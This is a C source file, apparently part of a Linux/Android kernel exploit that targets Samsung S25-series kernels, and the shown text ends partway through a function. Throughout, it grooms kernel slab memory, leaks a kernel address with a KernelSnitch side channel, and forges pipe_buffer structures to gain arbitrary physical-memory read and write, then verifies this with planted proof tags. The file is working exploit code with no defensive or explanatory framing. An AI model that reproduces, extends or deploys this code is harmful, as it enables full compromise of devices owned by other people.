#include "common.h"

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#include P0_FINGERPRINT_HEADER
#endif

#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

_Static_assert(sizeof(PHYS_READ_TAG) == sizeof(PHYS_WRITE_TAG),
               "phys proof tag sizes");

static int pipe_objects_ready;
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int p0_gate_holders[PIPE_RECLAIM][2];
static int p0_gate_holders_initialized;

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static void close_p0_gate_holders(void) {
  if (!p0_gate_holders_initialized) {
    return;
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    if (p0_gate_holders[i][0] >= 0) {
      close(p0_gate_holders[i][0]);
    }
    if (p0_gate_holders[i][1] >= 0) {
      close(p0_gate_holders[i][1]);
    }
    p0_gate_holders[i][0] = -1;
    p0_gate_holders[i][1] = -1;
  }
  p0_gate_holders_initialized = 0;
}
#endif
#endif

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

/*
 * pipe_buffer_slots — actual number of pipe buffer slots in use.
 *
 * Normally set to the requested count via F_SETPIPE_SZ.  On Samsung
 * S25 series kernels the seccomp policy blocks F_SETPIPE_SZ with a
 * custom size (EPERM), so resize_pipe_slots() falls back to reading
 * the kernel-assigned size with F_GETPIPE_SZ and derives the slot
 * count from that.  The default kernel pipe size is 16 pages
 * (PIPE_OBJS_PER_SLAB * PAGE_SIZE = 65536 bytes), which is exactly
 * what the pipe-slab scan expects, making the fallback safe.
 */
static int pipe_buffer_slots = PIPE_OBJS_PER_SLAB;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  int ret = fcntl(pipefd[0], F_SETPIPE_SZ, (int)(slots * PAGE_SIZE));
  if (ret < 0) {
    if (errno == EPERM) {
      /*
       * F_SETPIPE_SZ is blocked by the seccomp policy on S25 series
       * (S938N and siblings).  Fall back to reading the
       * kernel-assigned size and derive the actual slot count from it.
       * The kernel default of 16 pages matches PIPE_OBJS_PER_SLAB so
       * the pipe-slab scan is unaffected.
       */
      int actual_bytes = fcntl(pipefd[0], F_GETPIPE_SZ);
      if (actual_bytes > 0) {
        int actual_slots = actual_bytes / (int)PAGE_SIZE;
        if (actual_slots < 1)
          actual_slots = 1;
        pipe_buffer_slots = actual_slots;
        pr_info("resize_pipe_slots: F_SETPIPE_SZ EPERM, "
                "using kernel default %d slots (%d bytes)\n",
                actual_slots, actual_bytes);
      } else {
        pipe_buffer_slots = PIPE_OBJS_PER_SLAB;
        pr_warning("resize_pipe_slots: F_SETPIPE_SZ EPERM and "
                   "F_GETPIPE_SZ failed, assuming %d slots\n",
                   pipe_buffer_slots);
      }
      return;
    }
    /* Any error other than EPERM is fatal — behave like SYSCHK. */
    pr_error("SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE)): %s\n",
             strerror(errno));
    exit(1);
  }
  /* Success: record how many slots the kernel actually gave us. */
  pipe_buffer_slots = ret / (int)PAGE_SIZE;
  if (pipe_buffer_slots < 1)
    pipe_buffer_slots = 1;
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_OBJS_PER_SLAB);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
    close_ctx_memfds(&prep);
    close_ctx_memfds(&spray);
    close_ctx_memfds(&pre);
    close_ctx_memfds(&post);
    free_ctx_storage(&prep);
    free_ctx_storage(&spray);
    free_ctx_storage(&pre);
    free_ctx_storage(&post);
    free(buf);
    return 0;
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (getenv("KS_LEAK_ONLY")) {
    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
               leaked, base, (leaked - base) / MM_STRUCT_SZ);
    fflush(NULL);
    _exit(0);
  }
#endif

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
      pipe_fds_drain[i][0] = -1;
      pipe_fds_drain[i][1] = -1;
    }
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_warning("pipe page child did not report base\n");
    base = 0;
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    close(pipe_fds_drain[i][0]);
    close(pipe_fds_drain[i][1]);
    pipe_fds_drain[i][0] = -1;
    pipe_fds_drain[i][1] = -1;
  }
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  close_p0_gate_holders();
#else
  if (p0_gate_holders_initialized) {
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      if (p0_gate_holders[i][0] >= 0) {
        close(p0_gate_holders[i][0]);
      }
      if (p0_gate_holders[i][1] >= 0) {
        close(p0_gate_holders[i][1]);
      }
      p0_gate_holders[i][0] = -1;
      p0_gate_holders[i][1] = -1;
    }
    p0_gate_holders_initialized = 0;
  }
#endif
#endif

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  pipe_buffer_slots = PIPE_OBJS_PER_SLAB;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
          kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache);
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t cache08 = kernel_read64(fd, head + 0x08);
    uint64_t cache10 = kernel_read64(fd, head + 0x10);
    uint64_t cache18 = kernel_read64(fd, head + 0x18);
    uint64_t cache20 = kernel_read64(fd, head + 0x20);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
            "cache08=%016llx cache10=%016llx cache18=%016llx "
            "cache20=%016llx type=%08x match=%d\n",
            off / PAGE_SIZE, page, head,
            (unsigned long long)cache08,
            (unsigned long long)cache10,
            (unsigned long long)cache18,
            (unsigned long long)cache20, page_type, cache_match);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= (uint32_t)pipe_buffer_slots) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > (uint32_t)pipe_buffer_slots) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  struct user_pipe_buffer restored;
  size_t direct_off = direct_addr & (PAGE_SIZE - 1);
  if (!out || !len || buf_addr > UINTPTR_MAX - (sizeof(saved) - 1) ||
      (buf_addr >> PAGE_SHIFT) !=
                  ((buf_addr + sizeof(saved) - 1) >> PAGE_SHIFT) ||
      !is_direct_ptr(direct_addr) || len > PAGE_SIZE - direct_off) {
    return 0;
  }
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  ssize_t patch = kernel_write_data(fd, buf_addr, &pb, sizeof(pb));
  if (patch != (ssize_t)sizeof(pb)) {
    int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                  (ssize_t)sizeof(saved);
    pr_error("pipe read buffer patch failed ret=%zd restore=%d\n",
             patch, restore);
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int restored_ok =
      kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
          (ssize_t)sizeof(saved) &&
      kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) ==
          (ssize_t)sizeof(restored) &&
      memcmp(&restored, &saved, sizeof(saved)) == 0;
  int ok = got == (ssize_t)len && restored_ok;
  if (!ok) {
    pr_error("pipe read failed got=%zd want=%zu restore=%d\n",
             got, len, restored_ok);
  }
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  struct user_pipe_buffer restored;
  size_t direct_off = direct_addr & (PAGE_SIZE - 1);
  if (!data || !len || buf_addr > UINTPTR_MAX - (sizeof(saved) - 1) ||
      (buf_addr >> PAGE_SHIFT) !=
                  ((buf_addr + sizeof(saved) - 1) >> PAGE_SHIFT) ||
      !is_direct_ptr(direct_addr) || len > PAGE_SIZE - direct_off) {
    return 0;
  }
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  ssize_t patch = kernel_write_data(fd, buf_addr, &pb, sizeof(pb));
  if (patch != (ssize_t)sizeof(pb)) {
    int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                  (ssize_t)sizeof(saved);
    pr_error("pipe write buffer patch failed ret=%zd restore=%d\n",
             patch, restore);
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int restored_ok =
      kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
          (ssize_t)sizeof(saved) &&
      kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) ==
          (ssize_t)sizeof(restored) &&
      memcmp(&restored, &saved, sizeof(saved)) == 0;
  int ok = wrote == (ssize_t)len && restored_ok;
  if (!ok) {
    pr_error("pipe write failed wrote=%zd want=%zu restore=%d\n",
             wrote, len, restored_ok);
  }
  return ok;
}

#if !defined(APP_EXACT_PIPE_BUFFER_ONLY) || !APP_EXACT_PIPE_BUFFER_ONLY
void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}
#endif

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  size_t page_off = direct_addr & (PAGE_SIZE - 1);
  if (!out || !len || len >= PAGE_SIZE || !is_direct_ptr(direct_addr) ||
      len > PAGE_SIZE - page_off) {
    return 0;
  }

  if (!pipebuf_addr) {
#if defined(APP_EXACT_PIPE_BUFFER_ONLY) && APP_EXACT_PIPE_BUFFER_ONLY
    return 0;
#else
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
#endif
  }
  int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
  return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  size_t page_off = direct_addr & (PAGE_SIZE - 1);
  if (!data || !len || len >= PAGE_SIZE || !is_direct_ptr(direct_addr) ||
      len > PAGE_SIZE - page_off) {
    return 0;
  }

  if (!pipebuf_addr) {
#if defined(APP_EXACT_PIPE_BUFFER_ONLY) && APP_EXACT_PIPE_BUFFER_ONLY
    return 0;
#else
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
#endif
  }
  int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
  return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
}

static int pipe_read64_checked(
    int fd, uintptr_t direct_addr, uint64_t *value) {
  return value &&
         pipe_phys_read_data(fd, direct_addr, value, sizeof(*value));
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  int ok = 0;
  int proof_saved = 0;
  int proof64_saved = 0;
  char saved_proof[sizeof(PHYS_WRITE_TAG)];
  char restored_proof[sizeof(saved_proof)];
  uint64_t saved_proof64 = 0;
  uint64_t restored_proof64 = 0;

  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof64_addr = proof_addr + 0x100;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1)) ||
      sizeof(PHYS_READ_TAG) > PAGE_SIZE - (proof_addr & (PAGE_SIZE - 1)) ||
      sizeof(saved_proof) > PAGE_SIZE - (proof_addr & (PAGE_SIZE - 1)) ||
      sizeof(saved_proof64) >
          PAGE_SIZE - (proof64_addr & (PAGE_SIZE - 1)) ||
      (proof_addr & ~(PAGE_SIZE - 1)) !=
          (proof64_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
            candidate_slab_cache, kmalloc_pipe_cache);
    return 0;
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len);
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_read_data(fd, proof_addr, saved_proof, sizeof(saved_proof)) !=
      (ssize_t)sizeof(saved_proof)) {
    pr_error("phys proof old read failed addr=%016zx size=%zu\n",
             proof_addr, sizeof(saved_proof));
    goto cleanup;
  }
  proof_saved = 1;
  if (kernel_read_data(fd, proof64_addr, &saved_proof64,
                       sizeof(saved_proof64)) !=
      (ssize_t)sizeof(saved_proof64)) {
    pr_error("phys proof64 old read failed addr=%016zx\n", proof64_addr);
    goto cleanup;
  }
  proof64_saved = 1;
  pr_info("phys proof spans data=%016zx-%016zx qword=%016zx-%016zx\n",
          proof_addr, proof_addr + sizeof(saved_proof) - 1,
          proof64_addr, proof64_addr + sizeof(saved_proof64) - 1);
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    goto cleanup;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  if (kernel_read_data(fd, proof_addr, physrw_after_write,
                       sizeof(overwrite)) != (ssize_t)sizeof(overwrite)) {
    goto cleanup;
  }

  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  if (kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64)) !=
      (ssize_t)sizeof(seed64)) {
    goto cleanup;
  }
  if (!pipe_read64_checked(fd, proof64_addr, &physrw_read64_before)) {
    goto cleanup;
  }
  physrw_read64_ok = physrw_read64_before == seed64;
